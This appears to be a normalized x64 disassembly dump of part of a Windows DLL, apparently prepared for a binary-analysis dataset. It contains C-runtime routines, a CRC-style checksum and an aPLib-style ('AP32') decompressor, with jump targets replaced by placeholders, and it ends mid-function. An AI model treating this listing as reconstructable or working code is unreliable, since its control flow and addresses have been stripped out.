mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rdi rdx
mov rbx rcx
cmp rcx rsi
jne r-xdata
mov ebp 0x20
mov edx ebp
call sub_18000f3cc
mov r11 rax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ rbx ] bp
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
add rbx 0x2
mov r9 rdi
mov ecx esi
mov r8 rsi
sub r9 rbx
mov rax rbx
cmp ecx esi
je r-xdata
cmp dx bp
je r-xdata
movsxd rdx ecx
cmp r11 rsi
lea rax [ r11 + 0x2 ]
lea r8 [ rbx + rdx * 2 ]
mov [ rdi + rdx * 2 ] si
cmovne r8 rax
cmp [ rdi + rdx * 2 - 0x2 ] bp
jne r-xdata
inc r8
mov [ r9 + rax ] dx
inc ecx
add rax 0x2
cmp r8 0x104
jl r-xdata
mov rax r8
lea rcx [ rdi + rdx * 2 - 0x2 ]
movzx edx [ rax ]
cmp dx si
je r-xdata
mov [ rcx ] si
sub rcx 0x2
dec rdx
cmp [ rcx ] bp
je r-xdata
cmp rdx rsi
jle r-xdata
sub_18000cc18
mov [ rsp + 0x8 ] rcx
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rdi
sub rsp 0x20
mov rdi rcx
test rcx rcx
je r-xdata
or rax 0xffffffffffffffff
test r8 r8
je r-xdata
cmp rdx 0x18
jb r-xdata
mov eax [ rdi ]
cmp eax 0x32335041
jne r-xdata
mov eax [ rdi + 0x4 ]
cmp eax 0x18
jb r-xdata
sub rdx rax
jb r-xdata
cmp [ rdi + 0x8 ] edx
ja r-xdata
add rcx rax
mov edx [ rdi + 0x8 ]
call sub_18000d01c
cmp eax [ rdi + 0xc ]
jne r-xdata
mov r9 [ rsp + 0x48 ]
mov edx [ rdi + 0x10 ]
cmp rdx r9
ja r-xdata
mov eax [ rdi + 0x4 ]
mov rcx [ rsp + 0x30 ]
mov edx [ rdi + 0x8 ]
mov r8 [ rsp + 0x40 ]
add rcx rax
call sub_18000ccd4
mov edx [ rdi + 0x10 ]
cmp rax rdx
jne r-xdata
mov rcx [ rsp + 0x40 ]
call sub_18000d01c
cmp eax [ rdi + 0x14 ]
mov eax [ rdi + 0x10 ]
je r-xdata
add rsp 0x20
pop rdi
retn
sub_18000ccd4
mov [ rsp + 0x8 ] r9
mov [ rsp + 0x10 ] r8
mov [ rsp + 0x18 ] rbp
push rbx
push rsi
push rdi
mov rsi rcx
mov r10 rdx
mov rdi r8
mov r11 r9
test rsi rsi
je r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
test rdi rdi
je r-xdata
mov rbp [ rsp + 0x30 ]
pop rdi
pop rsi
pop rbx
retn
cld
xor rdx rdx
mov al [ rsi ]
add rsi 0x1
sub r11 0x1
jb r-xdata
mov [ rdi ] al
add rdi 0x1
mov rbx 0x2
jae r-xdata
sub r10 0x1
jb r-xdata
sub r10 0x1
jb r-xdata
add dl dl
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
jae r-xdata
sub r10 0x1
jb r-xdata
mov rax 0x1
xor rax rax
add dl dl
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
adc rax rax
jb r-xdata
sub r10 0x1
jb r-xdata
jae r-xdata
sub r10 0x1
jb r-xdata
add dl dl
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
sub r10 0x1
jb r-xdata
add dl dl
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
jb r-xdata
sub r10 0x1
jb r-xdata
mov al [ rsi ]
add rsi 0x1
xor rcx rcx
shr al 0x1
je r-xdata
adc rax rax
add dl dl
jne r-xdata
sub r10 0x1
jb r-xdata
add dl dl
jne r-xdata
sub rax rbx
mov rbx 0x1
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
mov rax rdi
sub rax [ rsp + 0x28 ]
adc rcx 0x2
mov rbp rax
mov r8 [ rsp + 0x20 ]
sub r8 r11
cmp rax r8
ja r-xdata
adc rax rax
add dl dl
jne r-xdata
sub r10 0x1
jb r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
add rax 0xffffffffffffffff
cmp rax 0xfffffe
ja r-xdata
mov rcx 0x1
sub r11 rcx
jb r-xdata
adc rax rax
add dl dl
jne r-xdata
sub r10 0x1
jb r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
shl rax 0x8
sub r10 0x1
jb r-xdata
adc rcx rcx
jb r-xdata
sub r10 0x1
jb r-xdata
mov r8 rdi
sub r8 rax
adc rax rax
je r-xdata
sub r10 0x1
jb r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
mov al [ rsi ]
add rsi 0x1
mov rbp rax
mov ecx 0x1
add dl dl
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
mov al [ r8 ]
add r8 0x1
mov [ rdi ] al
add rdi 0x1
sub rcx 0x1
jne r-xdata
mov rbx 0x1
jmp r-xdata
sub r11 0x1
jb r-xdata
mov r8 [ rsp + 0x20 ]
sub r8 r11
cmp rax r8
ja r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
adc ecx ecx
jb r-xdata
sub r10 0x1
jb r-xdata
jb r-xdata
sub r10 0x1
jb r-xdata
add dl dl
jne r-xdata
mov [ rdi ] al
add rdi 0x1
mov rbx 0x2
jmp r-xdata
mov r8 rdi
sub r8 rax
mov al [ r8 ]
add dl dl
jne r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
add dl dl
jne r-xdata
mov r8 [ rsp + 0x20 ]
sub r8 r11
cmp rbp r8
ja r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
jb r-xdata
sub r10 0x1
jb r-xdata
sub r11 rcx
jb r-xdata
add dl dl
jne r-xdata
cmp rax 0x7d00
sbb rcx 0xffffffffffffffff
cmp rax 0x500
sbb rcx 0xffffffffffffffff
cmp rax 0x80
adc rcx 0x0
cmp rax 0x80
adc rcx 0x0
mov r8 [ rsp + 0x20 ]
sub r8 r11
cmp rax r8
ja r-xdata
mov dl [ rsi ]
add rsi 0x1
add dl dl
inc dl
mov r8 rdi
sub r8 rbp
sub r11 rcx
jb r-xdata
mov al [ r8 ]
add r8 0x1
mov [ rdi ] al
add rdi 0x1
sub rcx 0x1
jne r-xdata
jmp r-xdata
mov r8 rdi
sub r8 rax
mov al [ r8 ]
add r8 0x1
mov [ rdi ] al
add rdi 0x1
sub rcx 0x1
jne r-xdata
jmp r-xdata
sub_18000d01c
lea r8 [ r--data ]
sub rax rax
test rcx rcx
je r-xdata
retn
dec rax
test rdx rdx
je r-xdata
not eax
test rcx 0x3
je r-xdata
mov r10 rdx
and r10 0x7
shr rdx 0x3
je r-xdata
xor al [ rcx ]
add rcx 0x1
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
add rdx 0xffffffffffffffff
jne r-xdata
mov rdx r10
test rdx rdx
je r-xdata
xor eax [ rcx ]
add rcx 0x4
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
xor eax [ rcx ]
add rcx 0x4
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
add rdx 0xffffffffffffffff
jne r-xdata
xor al [ rcx ]
add rcx 0x1
mov r9 0xff
and r9 rax
shr eax 0x8
xor eax [ r8 + r9 * 4 ]
add rdx 0xffffffffffffffff
jne r-xdata
sub_18000d138
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
sub rsp 0x60
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
lea r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rsp + 0x48 ] 0x42
mov [ rsp + 0x38 ] 0x7fffffff
call sub_18000fb24
sub [ rsp + 0x38 ] 0x1
mov ebx eax
js r-xdata
add rsp 0x60
pop rbx
retn
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov rcx [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
mov [ rcx ] 0x0
mov rcx [ rsp + 0x30 ]
inc rcx
mov [ rsp + 0x30 ] rcx
jmp r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov [ rcx ] 0x0
jmp r-xdata
sub [ rsp + 0x38 ] 0x1
js r-xdata
mov eax ebx
sub_18000d1fc
push rbx
sub rsp 0x20
cmp [ r--data ] 0x0
mov ebx ecx
je r-xdata
call sub_1800109d0
test rax rax
je r-xdata
lea rcx [ r--data ]
call sub_180010d00
test eax eax
je r-xdata
mov ecx ebx
call [ ExitThread@IAT ]
mov rcx rax
call sub_180010bb0
call [ r--data ]
sub_18000d26c
push rbx
sub rsp 0x20
mov rbx rcx
call sub_1800108e8
call sub_1800108e0
mov ecx eax
call FlsGetValue
mov r11 rax
test rax rax
jne r-xdata
mov rax [ rbx + 0x90 ]
mov rcx rbx
mov [ r11 + 0x90 ] rax
mov rax [ rbx + 0x98 ]
mov [ r11 + 0x98 ] rax
mov rax [ rbx + 0x8 ]
mov [ r11 + 0x8 ] rax
call sub_180010a78
call sub_1800108e0
mov rdx rbx
mov ecx eax
call FlsSetValue
test eax eax
jne r-xdata
call sub_18000d240
lea rcx [ r--data ]
call sub_180010d00
test eax eax
je r-xdata
call [ GetCurrentThreadId@IAT ]
mov [ rbx ] eax
jmp r-xdata
call [ GetLastError@IAT ]
mov ecx eax
call [ ExitThread@IAT ]
call [ r--data ]
cmp [ r--data ] 0x0
je r-xdata
sub_18000d30c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
push r12
push r13
sub rsp 0x30
xor ebx ebx
mov rbp r9
mov rsi r8
mov r12d edx
mov r13 rcx
test r8 r8
jne r-xdata
call sub_1800108e8
mov edx 0x2c8
mov ecx 0x1
call sub_180011510
mov rdi rax
test rax rax
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] rbx
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
jmp r-xdata
mov rcx rdi
call sub_18000e06c
test ebx ebx
je r-xdata
call sub_180010a54
mov rcx rdi
mov rdx [ rax + 0xc0 ]
call sub_18001091c
mov rcx [ rsp + 0x78 ]
or [ rdi + 0x8 ] 0xffffffffffffffff
mov eax [ rsp + 0x70 ]
test rcx rcx
lea r8 [ rsp + 0x60 ]
cmovne r8 rcx
mov rdx r12
mov r9 rdi
mov [ rsp + 0x28 ] r8
lea r8 [ sub_18000d26c ]
mov rcx r13
mov [ rdi + 0x90 ] rsi
mov [ rdi + 0x98 ] rbp
mov [ rsp + 0x20 ] eax
call [ CreateThread@IAT ]
test rax rax
jne r-xdata
xor eax eax
mov ecx ebx
call sub_180010874
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x30
pop r13
pop r12
pop rdi
retn
call [ GetLastError@IAT ]
mov ebx eax
sub_18000d428
push rbx
sub rsp 0x20
mov rbx rcx
mov [ rcx + 0x18 ] 0x0
test rdx rdx
jne r-xdata
movdqu xmm0 [ rdx ]
movdqu [ rcx ] xmm0
call sub_180010a54
mov [ rbx + 0x10 ] rax
mov rdx [ rax + 0xc0 ]
mov [ rbx ] rdx
mov rcx [ rax + 0xb8 ]
mov [ rbx + 0x8 ] rcx
mov rcx [ rw-data ]
cmp rdx rcx
je r-xdata
mov rax [ rw-data ]
cmp [ rbx + 0x8 ] rax
je r-xdata
mov eax [ rax + 0xc8 ]
test [ rw-data ] eax
jne r-xdata
mov rax [ rbx + 0x10 ]
test [ rax + 0xc8 ] 0x2
jne r-xdata
mov rax [ rbx + 0x10 ]
mov ecx [ rax + 0xc8 ]
test [ rw-data ] ecx
jne r-xdata
call sub_18000e57c
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
or [ rax + 0xc8 ] 0x2
mov [ rbx + 0x18 ] 0x1
jmp r-xdata
call sub_180011e5c
mov [ rbx + 0x8 ] rax
sub_18000d4d4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
push rdi
sub rsp 0x50
mov rsi rcx
mov rdi rdx
lea rcx [ rax - 0x28 ]
mov rdx r8
call sub_18000d428
xor ebp ebp
cmp rsi rbp
jne r-xdata
cmp rdi rbp
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbp
mov [ rax ] 0x16
call sub_180010764
cmp [ rsp + 0x48 ] bpl
je r-xdata
mov rax [ rsp + 0x30 ]
cmp [ rax + 0x14 ] ebp
jne r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov rax [ rsp + 0x40 ]
and [ rax + 0xc8 ] 0xfffffffd
movzx ecx [ rsi ]
lea rdx [ rsp + 0x30 ]
call sub_180012440
movzx ecx [ rdi ]
lea rdx [ rsp + 0x30 ]
mov bx ax
add rsi 0x2
call sub_180012440
add rdi 0x2
cmp bx bp
je r-xdata
movzx ebx [ rsi ]
cmp bx 0x41
jb r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x50
pop rdi
retn
movzx ecx ax
movzx eax bx
sub eax ecx
cmp [ rsp + 0x48 ] bpl
je r-xdata
cmp bx ax
je r-xdata
movzx eax [ rdi ]
cmp ax 0x41
jb r-xdata
cmp bx 0x5a
ja r-xdata
mov rcx [ rsp + 0x40 ]
and [ rcx + 0xc8 ] 0xfffffffd
add rsi 0x2
add rdi 0x2
cmp bx bp
je r-xdata
cmp ax 0x5a
ja r-xdata
add bx 0x20
cmp bx ax
je r-xdata
add ax 0x20
jmp r-xdata
sub_18000d5e8
push rbx
sub rsp 0x30
xor ebx ebx
mov r9 rcx
cmp [ rw-data ] ebx
jne r-xdata
xor r8d r8d
call sub_18000d4d4
cmp rcx rbx
jne r-xdata
cmp rdx rbx
je r-xdata
call sub_180010834
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rsp + 0x20 ] rbx
mov [ rax ] 0x16
call sub_180010764
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ r9 ]
cmp ax 0x41
jb r-xdata
add rsp 0x30
pop rbx
retn
movzx ecx [ rdx ]
cmp cx 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
add r9 0x2
add rdx 0x2
cmp ax bx
je r-xdata
cmp cx 0x5a
ja r-xdata
add ax 0x20
movzx ecx cx
movzx eax ax
sub eax ecx
jmp r-xdata
cmp ax cx
je r-xdata
add cx 0x20
sub_18000d67c
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
sub rsp 0x60
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
lea r9 [ rsp + 0x80 ]
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov [ rsp + 0x38 ] 0x7fffffff
mov [ rsp + 0x48 ] 0x42
call sub_180012658
sub [ rsp + 0x38 ] 0x1
mov ebx eax
js r-xdata
add rsp 0x60
pop rbx
retn
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov rcx [ rsp + 0x30 ]
mov [ rcx ] 0x0
jmp r-xdata
mov eax ebx
sub_18000d718
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x20 ] r9
push rbx
push rdi
sub rsp 0x68
mov r10 r8
mov rbx rcx
test r8 r8
jne r-xdata
test rdx rdx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
lea r9 [ rsp + 0x98 ]
mov [ rsp + 0x48 ] 0x42
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
cmp rdx 0x3fffffff
jbe r-xdata
test rcx rcx
je r-xdata
add rsp 0x68
pop rdi
pop rbx
retn
lea eax [ rdx + rdx ]
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x38 ] 0x7fffffff
jmp r-xdata
sub [ rsp + 0x38 ] 0x1
js r-xdata
lea rcx [ rsp + 0x30 ]
xor r8d r8d
mov rdx r10
call sub_18000fb24
mov edi eax
test rbx rbx
je r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov rax [ rsp + 0x30 ]
mov rax [ rsp + 0x30 ]
mov [ rax ] 0x0
mov rax [ rsp + 0x30 ]
inc rax
mov [ rsp + 0x30 ] rax
jmp r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov [ rax ] 0x0
jmp r-xdata
sub [ rsp + 0x38 ] 0x1
js r-xdata
mov eax edi
sub_18000d800
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r12 [ rsp + 0xa8 ]
mov r13 [ rsp + 0x98 ]
mov rdi rcx
xor ecx ecx
mov r15 r9
mov r14 rdx
mov r9 r8
mov esi ecx
mov [ rsp + 0x70 ] ecx
cmp rdi rcx
je r-xdata
mov esi 0x1
jmp r-xdata
cmp rdx rcx
jne r-xdata
cmp r14 rcx
je r-xdata
cmp r8 rcx
je r-xdata
cmp r8 rcx
je r-xdata
cmp r15 rcx
je r-xdata
cmp r9 rcx
jbe r-xdata
cmp r15 rcx
jne r-xdata
cmp r13 rcx
je r-xdata
cmp [ rsp + 0x90 ] rcx
jbe r-xdata
mov [ r14 ] cx
cmp [ rsp + 0x90 ] rcx
je r-xdata
cmp [ rsp + 0x90 ] rcx
jne r-xdata
cmp r12 rcx
je r-xdata
cmp [ rsp + 0xa0 ] rcx
jbe r-xdata
mov [ r15 ] cx
cmp r13 rcx
jne r-xdata
jmp r-xdata
cmp rdi rcx
jne r-xdata
cmp [ rsp + 0xb0 ] rcx
jbe r-xdata
mov [ r13 ] cx
cmp [ rsp + 0xa0 ] rcx
je r-xdata
cmp [ rsp + 0xa0 ] rcx
jne r-xdata
cmp esi ecx
jne r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
mov ebx 0x16
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] ebx
call sub_180010764
mov eax ebx
jmp r-xdata
mov [ r12 ] cx
cmp r12 rcx
jne r-xdata
jmp r-xdata
call sub_180010834
mov ecx 0x22
mov [ rax ] ecx
mov eax ecx
mov rbx [ rsp + 0x78 ]
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
cmp [ rsp + 0xb0 ] rcx
je r-xdata
cmp [ rsp + 0xb0 ] rcx
jne r-xdata
mov eax 0x1
mov rbx rdi
jmp r-xdata
cmp [ rbx ] 0x3a
jne r-xdata
dec rax
add rbx 0x2
cmp rax rcx
ja r-xdata
cmp rdx rcx
je r-xdata
cmp rdx rcx
je r-xdata
cmp [ rbx ] cx
je r-xdata
movzx eax [ rdi ]
mov rbp rcx
mov rsi rcx
mov rbx rdi
cmp ax cx
je r-xdata
mov [ rdx ] cx
lea rdi [ rbx + 0x2 ]
jmp r-xdata
cmp r8 0x3
jb r-xdata
cmp r15 rcx
je r-xdata
cmp ax 0x2f
je r-xdata
mov r9d 0x2
mov r8 rdi
or rdx 0xffffffffffffffff
mov rcx r14
call sub_180013140
xor ecx ecx
cmp rsi rcx
je r-xdata
mov [ r15 ] cx
lea rbp [ rbx + 0x2 ]
cmp ax 0x5c
je r-xdata
cmp r13 rcx
je r-xdata
cmp rsi rdi
jb r-xdata
cmp rbp rcx
je r-xdata
cmp ax 0x2e
jne r-xdata
cmp r12 rcx
je r-xdata
sub rbx rdi
sar rbx 0x1
cmp [ rsp + 0xa0 ] rbx
jbe r-xdata
cmp r13 rcx
je r-xdata
cmp r15 rcx
je r-xdata
add rbx 0x2
mov ax [ rbx ]
cmp ax cx
jne r-xdata
mov rsi rbx
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ r12 ] cx
mov esi [ rsp + 0x70 ]
mov r9 [ rsp + 0x80 ]
mov r9 rbx
mov r8 rdi
or rdx 0xffffffffffffffff
mov rcx r13
call sub_180013140
xor ecx ecx
cmp r12 rcx
je r-xdata
mov r9 rsi
sub r9 rdi
sar r9 0x1
cmp [ rsp + 0xa0 ] r9
jbe r-xdata
mov rdi rbp
jmp r-xdata
mov r9 rbp
sub r9 rdi
sar r9 0x1
cmp [ rsp + 0x90 ] r9
jbe r-xdata
sub rbx rsi
sar rbx 0x1
cmp [ rsp + 0xb0 ] rbx
jbe r-xdata
mov r8 rdi
or rdx 0xffffffffffffffff
mov rcx r13
call sub_180013140
xor ecx ecx
mov r8 rdi
or rdx 0xffffffffffffffff
mov rcx r15
call sub_180013140
xor ecx ecx
mov r9 rbx
mov r8 rsi
or rdx 0xffffffffffffffff
mov rcx r12
call sub_180013140
jmp r-xdata
sub_18000dab4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x50
mov rbx r8
mov rdi rdx
mov r8d 0x100
mov rsi rcx
mov rcx [ rsp + 0x80 ]
mov rax rcx
neg rax
mov rax r9
sbb r11 r11
and r11 r8
neg rax
mov rax rbx
sbb r10 r10
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x38 ] rcx
and r10 r8
neg rax
mov rax rdi
sbb rdx rdx
mov [ rsp + 0x30 ] r10
mov [ rsp + 0x28 ] r9
and rdx r8
neg rax
mov r9 rbx
sbb r8 r8
mov [ rsp + 0x20 ] rdx
mov rdx rdi
and r8d 0x3
mov rcx rsi
call sub_18000d800
mov rbx [ rsp + 0x60 ]
mov rsi [ rsp + 0x68 ]
add rsp 0x50
pop rdi
retn
sub_18000db4c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_18001322c
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000e06c
sub_18000dbb8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
lea rax [ r--data ]
mov ebx edx
mov rdi rcx
mov [ rcx ] rax
call sub_180013470
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_18000e06c
sub_18000dc18
push rbx
sub rsp 0x40
mov rbx rcx
jmp r-xdata
call sub_18000e0ac
test rax rax
je r-xdata
mov rcx rbx
call sub_1800134e0
test eax eax
je r-xdata
add rsp 0x40
pop rbx
retn
mov eax [ rw-data ]
mov r8d 0x1
lea rbx [ r--data ]
test r8b al
jne r-xdata
mov rcx rbx
lea rdx [ rw-data ]
lea rcx [ rsp + 0x20 ]
call sub_1800133f0
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] rbx
call sub_180013514
int3
or eax r8d
lea rdx [ rw-data ]
lea rcx [ rw-data ]
mov [ rw-data ] eax
call sub_1800133d4
lea rcx [ sub_180023914 ]
mov [ rw-data ] rbx
call sub_18000dfe4
sub_18000dcb4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x60
mov rbp rcx
mov rcx rdx
mov rsi r9
mov rdi r8
mov rbx rdx
call sub_1800135a8
test rbx rbx
jne r-xdata
test rdi rdi
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x48 ] 0x49
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x30 ] rbx
cmp rax 0x3fffffff
jbe r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x10 ]
mov rbp [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
add eax eax
mov [ rsp + 0x38 ] eax
mov [ rsp + 0x38 ] 0x7fffffff
jmp r-xdata
mov r9 [ rsp + 0x90 ]
lea rcx [ rsp + 0x30 ]
mov r8 rsi
mov rdx rdi
call rbp
sub_18000dd60
mov r11 rsp
mov [ r11 + 0x10 ] rdx
mov [ r11 + 0x18 ] r8
mov [ r11 + 0x20 ] r9
sub rsp 0x38
mov r8 rdx
lea rax [ r11 + 0x18 ]
mov rdx rcx
lea rcx [ sub_1800136b0 ]
xor r9d r9d
mov [ r11 - 0x18 ] rax
call sub_18000dcb4
add rsp 0x38
retn
sub_18000dd98
mov [ rsp + 0x8 ] rdi
xor edi edi
mov r9 rcx
cmp r8 rdi
je r-xdata
mov rdi [ rsp + 0x8 ]
mov rax r9
retn
movzx eax [ rdx ]
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp ax di
je r-xdata
cmp r8 rdi
je r-xdata
sub r8 0x1
jne r-xdata
sub r8 0x1
je r-xdata
movzx eax di
mov rdi rcx
mov rcx r8
[ rdi ]
sub_18000dde0
push rbx
sub rsp 0x60
test rdx rdx
jne r-xdata
test rcx rcx
je r-xdata
call sub_180010834
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
mov [ rax ] 0x16
call sub_180010764
or eax 0xffffffff
jmp r-xdata
mov [ rsp + 0x40 ] rcx
mov [ rsp + 0x30 ] rcx
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x48 ] 0x42
mov [ rsp + 0x38 ] 0x7fffffff
call sub_18000fb24
sub [ rsp + 0x38 ] 0x1
mov ebx eax
js r-xdata
add rsp 0x60
pop rbx
retn
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov rcx [ rsp + 0x30 ]
mov rcx [ rsp + 0x30 ]
mov [ rcx ] 0x0
mov rcx [ rsp + 0x30 ]
inc rcx
mov [ rsp + 0x30 ] rcx
jmp r-xdata
lea rdx [ rsp + 0x30 ]
xor ecx ecx
call sub_18000f884
mov [ rcx ] 0x0
jmp r-xdata
sub [ rsp + 0x38 ] 0x1
js r-xdata
mov eax ebx
sub_18000de98
push rbx
sub rsp 0x20
mov edx 0x8
lea ecx [ rdx + 0x18 ]
call sub_180011510
mov rcx rax
mov rbx rax
call __imp_EncodePointer
mov [ rw-data ] rax
mov [ rw-data ] rax
test rbx rbx
jne r-xdata
and [ rbx ] 0x0
xor eax eax
lea eax [ rbx + 0x18 ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000dedc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r14 rcx
call sub_18001115c
nop
mov rcx [ rw-data ]
call DecodePointer
mov r12 rax
mov rcx [ rw-data ]
call DecodePointer
mov rbx rax
cmp rax r12
jb r-xdata
xor ebx ebx
mov rdi rax
sub rdi r12
lea r13 [ rdi + 0x8 ]
cmp r13 0x8
jb r-xdata
mov rcx r12
call sub_180014a18
mov rsi rax
cmp rax r13
jae r-xdata
mov rcx r14
call __imp_EncodePointer
mov [ rbx ] rax
lea rcx [ rbx + 0x8 ]
call __imp_EncodePointer
mov [ rw-data ] rax
mov rbx r14
jmp r-xdata
mov edx 0x1000
cmp rax rdx
cmovb rdx rax
add rdx rax
cmp rdx rax
jb r-xdata
call sub_180011168
mov rax rbx
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
xor ebx ebx
mov rcx r12
call sub_180011594
xor ebx ebx
cmp rax rbx
jne r-xdata
mov rcx r12
call sub_180011594
cmp rax rbx
je r-xdata
sar rdi 0x3
lea rbx [ rax + rdi * 8 ]
mov rcx rax
call __imp_EncodePointer
mov [ rw-data ] rax
jmp r-xdata
lea rdx [ rsi + 0x20 ]
cmp rdx rsi
jb r-xdata
sub_18000dffc
xor r11d r11d
mov r10 rdx
mov r8 rcx
